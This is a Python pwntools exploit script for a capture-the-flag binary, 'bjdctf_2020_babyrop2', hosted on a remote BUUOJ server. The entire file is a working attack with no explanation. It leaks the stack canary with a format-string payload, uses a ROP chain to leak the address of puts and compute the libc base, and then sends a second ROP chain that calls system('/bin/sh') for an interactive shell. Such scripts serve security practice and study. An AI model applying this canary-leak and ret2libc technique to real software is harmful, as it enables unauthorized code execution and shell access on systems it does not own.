from pwn import *
from LibcSearcher import *

elf = ELF('./bjdctf_2020_babyrop2')

local = 0
if local == 1:
    io = process('./bjdctf_2020_babyrop2')
    #gdb.attach(io,'b * 0x400857')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    io = remote('node4.buuoj.cn',25887)
    libc = ELF('libc-2.23-0ubuntu11.so')

io.recvuntil("help u!\n")
payload = '%7$p'
io.sendline(payload)
canary_addr = io.recvuntil("\n")
canary_addr = int(canary_addr[:-1],16)

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
vuln_address = 0x400887
rdi_ret = 0x0000000000400993
ret = 0x00000000004005f9

payload2 = 'a'*(0x20-8)+p64(canary_addr)+p64(0xdeadbeef)+p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln_address)
io.recvuntil("Pull up your sword and tell me u story!\n")
io.sendline(payload2)

puts_addr = u64(io.recv(6)+'\x00\x00')
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh = libc_base + libc.search('/bin/sh').next()

payload3 = 'a'*(0x20-8)+p64(canary_addr)+p64(0xdeadbeef)+p64(rdi_ret)+p64(binsh)+p64(system_addr)+p64(ret)
io.recvuntil("story!\n")
io.sendline(payload3)


io.interactive()
